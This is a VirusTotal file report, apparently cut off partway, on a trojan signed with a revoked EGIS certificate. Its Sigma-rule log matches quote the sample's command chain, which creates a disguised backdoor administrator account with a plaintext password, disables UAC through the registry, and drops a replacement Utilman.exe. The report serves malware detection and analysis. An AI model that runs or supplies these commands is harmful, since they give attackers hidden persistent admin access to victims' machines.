{
    "data":  {
                 "id":  "c0fd86c44645823ef528745da38d356a177e465d4320cfa6971c8c9d4cb5c6c9",
                 "type":  "file",
                 "links":  {
                               "self":  "https://www.virustotal.com/api/v3/files/c0fd86c44645823ef528745da38d356a177e465d4320cfa6971c8c9d4cb5c6c9"
                           },
                 "attributes":  {
                                    "first_submission_date":  1528044046,
                                    "first_seen_itw_date":  1641320779,
                                    "crowdsourced_ids_stats":  {
                                                                   "high":  0,
                                                                   "medium":  0,
                                                                   "low":  1,
                                                                   "info":  0
                                                               },
                                    "creation_date":  1489056673,
                                    "last_analysis_stats":  {
                                                                "malicious":  53,
                                                                "suspicious":  0,
                                                                "undetected":  18,
                                                                "harmless":  0,
                                                                "timeout":  1,
                                                                "confirmed-timeout":  0,
                                                                "failure":  0,
                                                                "type-unsupported":  4
                                                            },
                                    "last_submission_date":  1699341558,
                                    "vhash":  "074056655d15555058z4chz1011z1fz",
                                    "last_analysis_date":  1767767002,
                                    "trid":  [
                                                 {
                                                     "file_type":  "Win32 Executable MS Visual C++ (generic)",
                                                     "probability":  47.3
                                                 },
                                                 {
                                                     "file_type":  "Win64 Executable (generic)",
                                                     "probability":  15.9
                                                 },
                                                 {
                                                     "file_type":  "Win32 Dynamic Link Library (generic)",
                                                     "probability":  9.9
                                                 },
                                                 {
                                                     "file_type":  "Win16 NE executable (generic)",
                                                     "probability":  7.6
                                                 },
                                                 {
                                                     "file_type":  "Win32 Executable (generic)",
                                                     "probability":  6.8
                                                 }
                                             ],
                                    "threat_severity":  {
                                                            "threat_severity_level":  "SEVERITY_HIGH",
                                                            "threat_severity_data":  {
                                                                                         "belongs_to_bad_collection":  true,
                                                                                         "num_gav_detections":  2,
                                                                                         "popular_threat_category":  "trojan",
                                                                                         "belongs_to_threat_actor":  true,
                                                                                         "has_references":  true
                                                                                     },
                                                            "last_analysis_date":  "1707553543",
                                                            "version":  5,
                                                            "level_description":  "Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes."
                                                        },
                                    "reputation":  0,
                                    "signature_info":  {
                                                           "verified":  "A certificate was explicitly revoked by its issuer.",
                                                           "x509":  [
                                                                        {
                                                                            "thumbprint_sha256":  "8D722F81A9C113C0791DF136A2966DB26C950A971DB46B4199F4EA54B78BFB9F",
                                                                            "name":  "thawte Primary Root CA",
                                                                            "algorithm":  "sha1RSA",
                                                                            "thumbprint_md5":  "8CCADC0B22CEF5BE72AC411A11A8D812",
                                                                            "valid from":  "2006-11-17 00:00:00",
                                                                            "valid to":  "2036-07-16 23:59:59",
                                                                            "serial number":  "34 4E D5 57 20 D5 ED EC 49 F4 2F CE 37 DB 2B 6D",
                                                                            "cert issuer":  "thawte Primary Root CA",
                                                                            "thumbprint":  "91C6D6EE3E8AC86384E548C299295C756C817B81"
                                                                        },
                                                                        {
                                                                            "valid usage":  "Client Auth, Code Signing",
                                                                            "thumbprint_sha256":  "C4D18E0A58E4EFFD17ED77C840B613EF15F551076EA92C2B77F6609A6C2557C7",
                                                                            "name":  "thawte SHA256 Code Signing CA",
                                                                            "algorithm":  "sha256RSA",
                                                                            "thumbprint_md5":  "871953A98D4150C33C69A0C5AE9A68C6",
                                                                            "valid from":  "2013-12-10 00:00:00",
                                                                            "valid to":  "2023-12-09 23:59:59",
                                                                            "serial number":  "71 A0 B7 36 95 DD B1 AF C2 3B 2B 9A 18 EE 54 CB",
                                                                            "cert issuer":  "thawte Primary Root CA",
                                                                            "thumbprint":  "D00CFDBF46C98A838BC10DC4E097AE0152C461BC"
                                                                        },
                                                                        {
                                                                            "valid usage":  "Code Signing",
                                                                            "thumbprint_sha256":  "7EFFA955FA23907E8905FCD3FF34B8838EE224EB7B2043A07402796A3F3A1A6B",
                                                                            "name":  "EGIS Co., Ltd.",
                                                                            "algorithm":  "sha256RSA",
                                                                            "thumbprint_md5":  "8CB5484E659455199F60AA1F5F3E232A",
                                                                            "valid from":  "2015-04-28 00:00:00",
                                                                            "valid to":  "2017-06-26 23:59:59",
                                                                            "serial number":  "0F FF E4 32 A5 3F F0 3B 92 23 F8 8B E1 B8 3D 9D",
                                                                            "cert issuer":  "thawte SHA256 Code Signing CA",
                                                                            "thumbprint":  "8F7C0CF259B1F19C15746FF589514AD5C2837689"
                                                                        }
                                                                    ],
                                                           "signers":  "EGIS Co., Ltd.; thawte SHA256 Code Signing CA; thawte",
                                                           "signers details":  [
                                                                                   {
                                                                                       "status":  "This certificate or one of the certificates in the certificate chain is not time valid., Trust for this certificate or one of the certificates in the certificate chain has been revoked.",
                                                                                       "valid usage":  "Code Signing",
                                                                                       "name":  "EGIS Co., Ltd.",
                                                                                       "algorithm":  "sha256RSA",
                                                                                       "valid from":  "12:00 AM 04/28/2015",
                                                                                       "valid to":  "11:59 PM 06/26/2017",
                                                                                       "serial number":  "0F FF E4 32 A5 3F F0 3B 92 23 F8 8B E1 B8 3D 9D",
                                                                                       "cert issuer":  "thawte SHA256 Code Signing CA",
                                                                                       "thumbprint":  "8F7C0CF259B1F19C15746FF589514AD5C2837689"
                                                                                   },
                                                                                   {
                                                                                       "status":  "This certificate or one of the certificates in the certificate chain is not time valid.",
                                                                                       "valid usage":  "Client Auth, Code Signing",
                                                                                       "name":  "thawte SHA256 Code Signing CA",
                                                                                       "algorithm":  "sha256RSA",
                                                                                       "valid from":  "12:00 AM 12/10/2013",
                                                                                       "valid to":  "11:59 PM 12/09/2023",
                                                                                       "serial number":  "71 A0 B7 36 95 DD B1 AF C2 3B 2B 9A 18 EE 54 CB",
                                                                                       "cert issuer":  "thawte Primary Root CA",
                                                                                       "thumbprint":  "D00CFDBF46C98A838BC10DC4E097AE0152C461BC"
                                                                                   },
                                                                                   {
                                                                                       "status":  "Valid",
                                                                                       "valid usage":  "Client Auth, Code Signing, Email Protection, Server Auth",
                                                                                       "name":  "thawte",
                                                                                       "algorithm":  "sha1RSA",
                                                                                       "valid from":  "12:00 AM 11/17/2006",
                                                                                       "valid to":  "11:59 PM 07/16/2036",
                                                                                       "serial number":  "34 4E D5 57 20 D5 ED EC 49 F4 2F CE 37 DB 2B 6D",
                                                                                       "cert issuer":  "thawte Primary Root CA",
                                                                                       "thumbprint":  "91C6D6EE3E8AC86384E548C299295C756C817B81"
                                                                                   }
                                                                               ],
                                                           "pkcs7":  {
                                                                         "opusinfo":  [
                                                                                          {
                                                                                              "moreInfo":  "http://www.egiskorea.com",
                                                                                              "programName":  "XDLauncher Control 1.0.0.5 EGIS Co.,Ltd"
                                                                                          }
                                                                                      ]
                                                                     }
                                                       },
                                    "sandbox_verdicts":  {
                                                             "Zenbox":  {
                                                                            "category":  "malicious",
                                                                            "confidence":  72,
                                                                            "sandbox_name":  "Zenbox",
                                                                            "malware_classification":  [
                                                                                                           "MALWARE",
                                                                                                           "SPREADER",
                                                                                                           "EVADER"
                                                                                                       ]
                                                                        },
                                                             "C2AE":  {
                                                                          "category":  "undetected",
                                                                          "sandbox_name":  "C2AE",
                                                                          "malware_classification":  [
                                                                                                         "UNKNOWN_VERDICT"
                                                                                                     ]
                                                                      },
                                                             "Dr.Web vxCube":  {
                                                                                   "category":  "malicious",
                                                                                   "sandbox_name":  "Dr.Web vxCube",
                                                                                   "malware_classification":  [
                                                                                                                  "MALWARE"
                                                                                                              ]
                                                                               },
                                                             "Lastline":  {
                                                                              "category":  "malicious",
                                                                              "sandbox_name":  "Lastline",
                                                                              "malware_classification":  [
                                                                                                             "MALWARE"
                                                                                                         ]
                                                                          },
                                                             "Yomi Hunter":  {
                                                                                 "category":  "malicious",
                                                                                 "malware_classification":  [
                                                                                                                "MALWARE"
                                                                                                            ],
                                                                                 "sandbox_name":  "Yomi Hunter"
                                                                             }
                                                         },
                                    "unique_sources":  3,
                                    "tlsh":  "T15C636B97B7A1D132D992013429ACC7721A7EFC329975C44BF79A064D4EB07C0BA2B763",
                                    "sigma_analysis_results":  [
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "534ecedeba777d436d37888757fcae6c00842f791bdcb6c39d8c804ab3c6a535",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "User Added to Local Administrators",
                                                                       "rule_description":  "This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation activity",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=4732; SubjectUserSid=S-1-5-21-1015118539-3749460369-599379286-1001; MemberSid=S-1-5-21-1015118539-3749460369-599379286-1002; MemberName=-; SubjectUserName=george; TargetDomainName=Builtin; SubjectDomainName=DESKTOP-B0T93D6; TargetUserName=Administrators; TargetSid=S-1-5-32-544; PrivilegeList=-; SubjectLogonId=257541}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "80708cad12d59acde6c91bdfbb0ed867ffd0538e97f962f2ffd72040a66ecb6b",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Disable UAC Using Registry",
                                                                       "rule_description":  "Detects when an attacker tries to disable User Account Control (UAC) by changing its registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=7776; EventType=SetValue; Image=C:\\Users\\george\\Desktop\\file.exe; RuleName=T1088; UtcTime=1684198045; Details=DWORD (0x00000000); ProcessGuid={C784477D-D29A-6462-2006-000000004400}; TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "fd4f9d3b927e38cad7f6a36f5f41cae6a1450b551d9506408259953d8d4ee23d",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Add User to Local Administrators Group",
                                                                       "rule_description":  "Detects suspicious command line that adds an account to the local administrators/administrateurs group",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-D29D-6462-2906-000000004400}; ProcessId=7228; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-D29A-6462-2006-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\Desktop\\file.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7776; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=C:\\Windows\\System32\\cmd.exe /c C:\u0026cd\\\u0026cd windows\u0026cd system32\u0026net user DefaultAccounts Security1215! /add\u0026net user DefaultAccounts /FULLNAME:\"IIS Host Account\" /COMMENT:\"A user account managed by the IIS subsystem.\" /EXPIRES:NEVER /Active:YES\u0026net localgroup users DefaultAccounts /delete\u0026net localgroup Administrators DefaultAccounts /add\u0026net localgroup \"Network Configuration Operators\" DefaultAccounts /add\u0026net localgroup \"Power Users\" DefaultAccounts /add\u0026exit; EventID=1; LogonGuid=C784477D-3B4E-6441-05EE-030000000000; LogonId=257541; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\Desktop\\file.exe\"; UtcTime=1684198045; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-D2A0-6462-3606-000000004400}; ProcessId=8108; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-D29D-6462-2906-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7228; CurrentDirectory=C:\\Windows\\System32\\; CommandLine=net  localgroup Administrators DefaultAccounts /add; EventID=1; LogonGuid=C784477D-3B4E-6441-05EE-030000000000; LogonId=257541; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\System32\\cmd.exe /c C:\u0026cd\\\u0026cd windows\u0026cd system32\u0026net user DefaultAccounts Security1215! /add\u0026net user DefaultAccounts /FULLNAME:\"IIS Host Account\" /COMMENT:\"A user account managed by the IIS subsystem.\" /EXPIRES:NEVER /Active:YES\u0026net localgroup users DefaultAccounts /delete\u0026net localgroup Administrators DefaultAccounts /add\u0026net localgroup \"Network Configuration Operators\" DefaultAccounts /add\u0026net localgroup \"Power Users\" DefaultAccounts /add\u0026exit; UtcTime=1684198048; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-D2A0-6462-3706-000000004400}; ProcessId=8100; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-D2A0-6462-3606-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=net1.exe; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8108; CurrentDirectory=C:\\Windows\\System32\\; CommandLine=C:\\Windows\\system32\\net1  localgroup Administrators DefaultAccounts /add; EventID=1; LogonGuid=C784477D-3B4E-6441-05EE-030000000000; LogonId=257541; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  localgroup Administrators DefaultAccounts /add; UtcTime=1684198048; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "fd4f9d3b927e38cad7f6a36f5f41cae6a1450b551d9506408259953d8d4ee23d",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "User Added to Local Administrators Group",
                                                                       "rule_description":  "Detects addition of users to the local administrator group via \"Net\" or \"Add-LocalGroupMember\".",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{CommandLine=net  localgroup Administrators DefaultAccounts /add; Image=net; EventID=1}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{CommandLine=C:\\Windows\\System32\\cmd.exe /c C:\u0026cd\\\u0026cd windows\u0026cd system32\u0026net user DefaultAccounts Security1215! /add\u0026net user DefaultAccounts /FULLNAME:\"IIS Host Account\" /COMMENT:\"A user account managed by the IIS subsystem.\" /EXPIRES:NEVER /Active:YES\u0026net localgroup users DefaultAccounts /delete\u0026net localgroup Administrators DefaultAccounts /add\u0026net localgroup \"Network Configuration Operators\" DefaultAccounts /add\u0026net localgroup \"Power Users\" DefaultAccounts /add\u0026exit; Image=C:\\Windows\\System32\\cmd.exe; EventID=1}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{CommandLine=C:\\Windows\\system32\\net1  localgroup Administrators DefaultAccounts /add; Image=C:\\Windows\\system32\\net1; EventID=1}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "b5386a23355681c43cfbd2f2ccfe4b16ed45324d0d7b5583487a9f302ee1e427",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Creation of an Executable by an Executable",
                                                                       "rule_description":  "Detects the creation of an executable by another executable",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=7776; Image=C:\\Users\\george\\Desktop\\file.exe; RuleName=EXE; CreationUtcTime=1523489690; UtcTime=1684198045; ProcessGuid={C784477D-D29A-6462-2006-000000004400}; TargetFilename=C:\\Windows\\SysWOW64\\Utilman.exe}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "ba8140e5173f7647dc01d2d1aae82bf84283f52c7aece9e9a61f7f5e75ffe53a",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "A Member Was Added to a Security-Enabled Global Group",
                                                                       "rule_description":  "Detects activity when a member is added to a security-enabled global group",
                                                                       "rule_author":  "Alexandr Yampolskyi, SOC Prime",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=4728; MemberSid=S-1-5-21-1015118539-3749460369-599379286-1002; MemberName=-; SubjectUserName=george; TargetDomainName=DESKTOP-B0T93D6; PrivilegeList=-; TargetUserName=None; SubjectUserSid=S-1-5-21-1015118539-3749460369-599379286-1001; TargetSid=S-1-5-21-1015118539-3749460369-599379286-513; SubjectDomainName=DESKTOP-B0T93D6; SubjectLogonId=257541}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "f1048c602439313e72f67c634350106ba7b709512529457a6f0a5eca6835bc89",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Net.exe Execution",
                                                                       "rule_description":  "Detects execution of Net.exe, whether suspicious or benign.",
                                                                       "rule_author":  "Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community (improvements)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-D29D-6462-2C06-000000004400}; ProcessId=3372; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-D29D-6462-2906-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7228; CurrentDirectory=C:\\Windows\\System32\\; CommandLine=net  user DefaultAccounts Security1215! /add; EventID=1; LogonGuid=C784477D-3B4E-6441-05EE-030000000000; LogonId=257541; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\System32\\cmd.exe /c C:\u0026cd\\\u0026cd windows\u0026cd system32\u0026net user DefaultAccounts Security1215! /add\u0026net user DefaultAccounts /FULLNAME:\"IIS Host Account\" /COMMENT:\"A user account managed by the IIS subsystem.\" /EXPIRES:NEVER /Active:YES\u0026net localgroup users DefaultAccounts /delete\u0026net localgroup Administrators DefaultAccounts /add\u0026net localgroup \"Network Configuration Operators\" DefaultAccounts /add\u0026net localgroup \"Power Users\" DefaultAccounts /add\u0026exit; UtcTime=1684198045; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-D29D-6462-2D06-000000004400}; ProcessId=3320; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-D29D-6462-2C06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=net1.exe; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3372; CurrentDirectory=C:\\Windows\\System32\\; CommandLine=C:\\Windows\\system32\\net1  user DefaultAccounts Security1215! /add; EventID=1; LogonGuid=C784477D-3B4E-6441-05EE-030000000000; LogonId=257541; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  user DefaultAccounts Security1215! /add; UtcTime=1684198045; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-D29E-6462-3006-000000004400}; ProcessId=7620; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-D29D-6462-2906-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7228; CurrentDirectory=C:\\Windows\\System32\\; CommandLine=net  user DefaultAccounts /FULLNAME:\"IIS Host Account\" /COMMENT:\"A user account managed by the IIS subsystem.\" /EXPIRES:NEVER /Active:YES; EventID=1; LogonGuid=C784477D-3B4E-6441-05EE-030000000000; LogonId=257541; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\System32\\cmd.exe /c C:\u0026cd\\\u0026cd windows\u0026cd system32\u0026net user DefaultAccounts Security1215! /add\u0026net user DefaultAccounts /FULLNAME:\"IIS Host Account\" /COMMENT:\"A user account managed by the IIS subsystem.\" /EXPIRES:NEVER /Active:YES\u0026net localgroup users DefaultAccounts /delete\u0026net localgroup Administrators DefaultAccounts /add\u0026net localgroup \"Network Configuration Operators\" DefaultAccounts /add\u0026net localgroup \"Power Users\" DefaultAccounts /add\u0026exit; UtcTime=1684198046; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-D29E-6462-3206-000000004400}; ProcessId=7888; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-D29E-6462-3006-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073; OriginalFileName=net1.exe; ParentImage=C:\\Windows\\SysWOW64\\net.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7620; CurrentDirectory=C:\\Windows\\System32\\; CommandLine=C:\\Windows\\system32\\net1  user DefaultAccounts /FULLNAME:\"IIS Host Account\" /COMMENT:\"A user account managed by the IIS subsystem.\" /EXPIRES:NEVER /Active:YES; EventID=1; LogonGuid=C784477D-3B4E-6441-05EE-030000000000; LogonId=257541; Image=C:\\Windows\\SysWOW64\\net1.exe; IntegrityLevel=High; ParentCommandLine=net  user DefaultAccounts /FULLNAME:\"IIS Host Account\" /COMMENT:\"A user account managed by the IIS subsystem.\" /EXPIRES:NEVER /Active:YES; UtcTime=1684198046; RuleName=-}"
                                                                                             },
